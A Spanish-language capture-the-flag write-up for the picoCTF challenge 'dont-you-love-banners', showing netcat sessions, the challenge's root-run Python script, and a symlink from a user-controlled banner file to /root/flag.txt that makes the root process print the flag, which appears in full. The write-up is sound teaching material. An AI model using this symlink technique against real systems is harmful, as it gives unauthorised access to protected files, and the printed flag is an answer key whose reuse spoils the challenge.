### dont-you-love-banners
Can you abuse the banner?The server has been leaking some crucial information on `tethys.picoctf.net 53749`. Use the leaked information to get to the server.To connect to the running application use `nc tethys.picoctf.net 59949`. From the above information abuse the machine and find the flag in the /root directory.
### Solución 
primero entramos al primero puerto que nos da el problema. Ahi obtenemos la contrasena para entrar y contestar las preguntas siguientes
```
┌──(kali㉿kali)-[~]
└─$ nc tethys.picoctf.net 53749
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
^C
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ nc tethys.picoctf.net 59949
*************************************
**************WELCOME****************
*************************************

what is the password? 
My_Passw@rd_@1234
What is the top cyber security conference in the world?
DEF CON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper

```

Si nos vamos a la carpeta root podemos ver los archivos que no tienen permiso
```
player@challenge:/$ cd root/    
cd root/
player@challenge:/root$ ls
ls
flag.txt  script.py
player@challenge:/root$ cat flag.txt
cat flag.txt
cat: flag.txt: Permission denied

```
si hacemos cat al script.py
```
player@challenge:/root$ cat script.py
cat script.py

import os
import pty

incorrect_ans_reply = "Lol, good try, try again and good luck\n"

if __name__ == "__main__":
    try:
      with open("/home/player/banner", "r") as f:
        print(f.read())
    except:
      print("*********************************************")
      print("***************DEFAULT BANNER****************")
      print("*Please supply banner in /home/player/banner*")
      print("*********************************************")

try:
    request = input("what is the password? \n").upper()
    while request:
        if request == 'MY_PASSW@RD_@1234':
            text = input("What is the top cyber security conference in the world?\n").upper()
            if text == 'DEFCON' or text == 'DEF CON':
                output = input(
                    "the first hacker ever was known for phreaking(making free phone calls), who was it?\n").upper()
                if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':
                    scmd = 'su - player'
                    pty.spawn(scmd.split(' '))

                else:
                    print(incorrect_ans_reply)
            else:
                print(incorrect_ans_reply)
        else:
            print(incorrect_ans_reply)
            break

except:
    KeyboardInterrupt

```
Se hace un symlink para apuntar a la bandera y se ejecute antes de pedir la contrasena
```
player@challenge:~$ ln -sf /root/flag.txt /home/player/banner
```
Al volver a conectarnos nos da la bandera.
```
┌──(kali㉿kali)-[~]
└─$ nc tethys.picoctf.net 59949
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_ed6f9c71}

what is the password? 
```

picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_ed6f9c71}
### Notas
Este script se ejecuta como **root** cuando te conectas (por eso puede hacer el `pty.spawn` y por eso vive en `/root`). Lo primero que hace es intentar leer un archivo que **tú controlas**: `/home/player/banner`.

Si en lugar de un archivo de texto normal, creamos un **Enlace Simbólico (Symlink)** que apunte a la bandera, cuando el script de root intente imprimir el "banner", ¡imprimirá el contenido de la bandera en su lugar!
